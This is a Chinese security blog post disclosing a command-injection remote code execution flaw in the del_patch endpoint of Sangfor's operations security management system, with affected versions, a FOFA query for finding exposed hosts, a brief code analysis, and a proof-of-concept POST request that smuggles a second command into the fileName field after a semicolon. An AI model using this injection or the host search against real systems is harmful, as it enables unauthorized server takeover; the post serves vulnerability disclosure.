---
title: "深信服运维安全管理系统 del_patch 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html
asset_dir: assets/深信服运维安全管理系统-del_patch-远程命令执行漏洞
---

# 深信服运维安全管理系统 del\_patch 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/10 08:41
- 142浏览
- [0评论](#comment)
- 6分钟阅读

深入探索

补丁

服务器

软件

---

# 漏洞简介

深信服运维安全管理系统 del\_patch 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

文件大小转换

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.concentrationManagement.NodePatchController#delPatch`的实现逻辑

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-001-d78b482d13d2.webp)](https://image.mrxn.net/1a5842af80844141b2538d9b02eabb42.webp)

以及

深入探索

在线安全工具

传输层安全性协议

SQL注入防护

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-002-f789f33cb529.webp)](https://image.mrxn.net/ebc92fe84eff4694a2db46dc97833e52.webp)

参数**fileName**无任何过滤或校验被直接拼接进**cmd**命令里执行，从而造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-003-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/system;help/concentration_management/del_patch HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=123;RCE_POC
```

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-004-da9f893f0611.webp)](https://image.mrxn.net/12d2d8b7c8f347dabe88c6c3f823f30b.webp)

访问命令执行结果重定向文件，成功获取到[命令执行](https://mrxn.net/tag/rce)结果。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
